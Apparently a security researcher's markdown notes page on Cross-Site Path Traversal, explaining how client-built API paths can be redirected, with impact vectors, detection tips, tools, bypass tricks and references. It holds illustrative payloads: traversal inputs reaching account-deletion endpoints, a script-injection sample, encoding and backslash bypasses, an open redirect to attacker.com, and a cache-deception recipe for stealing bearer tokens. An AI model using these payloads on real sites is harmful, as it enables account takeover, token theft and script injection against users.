---
title: "Cross-Site Path Traversal (CSPT)"
type: technique
tags: [cspt, path-traversal, xss, csrf, api, bug-bounty, cspt2csrf, polyglot, file-upload, extension-flip]
date_created: 2026-08-17
date_updated: 2026-08-17
sources: []
related: ["[[xss]]", "[[csrf]]", "[[idor]]"]
status: active
---

# Cross-Site Path Traversal (CSPT)

## Overview

CSPT (Cross-Site Path Traversal) occurs when the path of a URL built by the client includes user input without sanitization, letting an attacker manipulate the path to point at a different endpoint than intended, potentially leading to XSS, CSRF, or client-side SSRF.

## Difference from classic LFI/Path Traversal

| Type | Location | Target |
|------|-------|------|
| LFI/Path Traversal | Server-side | System files |
| CSPT | Client-side | Different API endpoints |

## How it works

```javascript
// Vulnerable code (client-side)
const userId = new URLSearchParams(location.search).get('id');
fetch(`/api/users/${userId}/profile`)  // userId not sanitized

// Exploit
?id=../admin/config
// -> fetch('/api/users/../admin/config')
// -> fetch('/api/admin/config')  <- different endpoint!

// More sophisticated
?id=../../other-service/internal
// -> '/api/users/../../other-service/internal'
// -> '/other-service/internal'
```

## Impact vectors

### CSPT2CSRF
```javascript
// App fetches the manipulated path
// If the destination endpoint accepts POST and performs a sensitive action
// Attacker redirects the fetch to an unauthorized action
?id=../../account/delete
// -> DELETE /api/users/../../account/delete
// -> DELETE /api/account/delete  <- deletes account!
```

### CSPT2XSS
```javascript
// If the destination endpoint's response is rendered into the DOM without sanitization
fetch(`/api/content/${userControlledId}`)
  .then(r => r.text())
  .then(html => document.body.innerHTML = html)  // XSS!

// Destination endpoint returns attacker-controlled content
?id=../../public/user-content/malicious
// Response: <script>alert(1)</script>
```

## Identification

```bash
# 1. Search JS for fetch/XHR with a dynamically built path
grep -r "fetch\|XMLHttpRequest\|axios" js/ | grep "location\|params\|url"

# 2. URL parameters that appear in API paths
?file=, ?path=, ?id=, ?page=, ?section=, ?resource=

# 3. Try basic payloads
?id=../../../etc  # server-side traversal
?id=../../admin   # client-side CSPT -> different endpoints

# 4. Observe which URL is actually requested (devtools network)
```

## Real-world examples

```
# Based on PortSwigger research/labs:
# /api/profile?section=../settings/admin
# Loads /api/settings/admin instead of /api/profile/settings

# CSPT in SPA frameworks (React, Angular, Vue)
# Client-side router does not sanitize params -> malicious internal redirect
```

## Tools

- Burp/Caido : intercept JS requests
- Burp DOM Invader : trace path construction
- DevTools Network tab : verify requested URLs
- **Doyensec CSPTBurpExtension** : github.com/doyensec/CSPTBurpExtension
- **Doyensec CSPTPlayground** : open-source training lab
- **Gecko Chrome extension** : github.com/vitorfhc/gecko (dynamic detection with partial matching)
- **Burp Bambda** : list all sinks reachable from JS code (Doyensec whitepaper)

## Advanced techniques

### CSPT2CSRF: bypassing SameSite / CSRF tokens

The Doyensec CSPT2CSRF whitepaper formalizes CSPT as a CSRF vector that **bypasses all modern protections**:

| Capability | CSRF | CSPT2CSRF |
|---|---|---|
| POST CSRF | yes | yes |
| Control body | yes | no (but bypassable via query params) |
| Bypass anti-CSRF token | no | yes (front-end adds it automatically) |
| Bypass SameSite=Lax/Strict | no | yes (same-origin) |
| GET/PATCH/PUT/DELETE | no | yes |
| One-click | no | yes |

**Body restriction bypass**:
- Lax JSON schema: backend accepts extra params -> state-change passes
- Query param override: attacker controls the whole path, adds params the backend reads

### Extension flip pattern (Cache Deception + CSPT)

Combining CSPT with a `.css`/`.js` extension forces a CDN to cache an authenticated response -> **0-click ATO**.

```javascript
// SPA vulnerable:
fetch(`/v1/users/info/${userId}`, { headers: { Authorization: `Bearer ${token}` } });

// Exploit:
userId=../../../v1/token.css
// Browser fetches /v1/token.css with bearer -> CDN caches as .css
// Attacker: GET /v1/token.css (no auth) -> recovers token JSON
```

### Additional bypass tricks

```bash
# Backslash bypass (browser parser: \ == /)
?id=..%5C..%5C..%5Cadmin

# Double encoding (survives intermediate decoders)
?id=%252e%252e%2f%252e%252e%2fadmin

# Suffix removal with hash
?id=../uploads/xss.json%23   # hash does not reach the server
?id=../uploads/xss.json%3f   # ? truncates

# Tab/newline removal (URL spec)
fetch("/dir/.\n./blo\ncked\t-path")  # = "/blocked-path"

# Path-to-path obfuscation
%2e%0a%09%2E\other   # -> .\n\t.\other -> /other after removal

# Open redirect via // as first path part
fetch(`/${lang}/info`)  # lang=/attacker.com -> //attacker.com/info

# Single dot trick in multi-segment
fetch(`/users/${group}/${user}/posts/${id}`)
# group=..&user=uploads&id=xss.json -> /uploads/posts/xss.json

# Empty/dot value trick
?id=    # /users/
?id=/   # /users//
?id=.   # /users/.
```

### File upload polyglots

When an upload validates the format (PDF/WebP only), craft polyglots:
- PDF-as-JSON (magic bytes not at start)
- WebP-as-JSON
- HTML is trivial, no strict format

### Source / sink formalization (Doyensec)

**Source types**:
- Reflected: `?id=XXX`
- DOM-based: `#id=XXX`, location.hash, postMessage
- Stored: read from DB

**Sink restrictions** (same host, same HTTP method as the source, headers the front-end adds):
- Host: does not change
- Method: defined by the source (POST source -> POST sink)
- Headers: include auth + CSRF tokens automatically
- Body: source may include it; **bypass via query param override**

## References

- Doyensec CSPT2CSRF whitepaper
- Doyensec blog: CSPT file upload (PDF/WebP polyglots)
- Khodayari & Pellegrino USENIX 2021 paper
- CVE-2023-45316, CVE-2023-6458 (Mattermost), CVE-2023-5123 (Grafana)
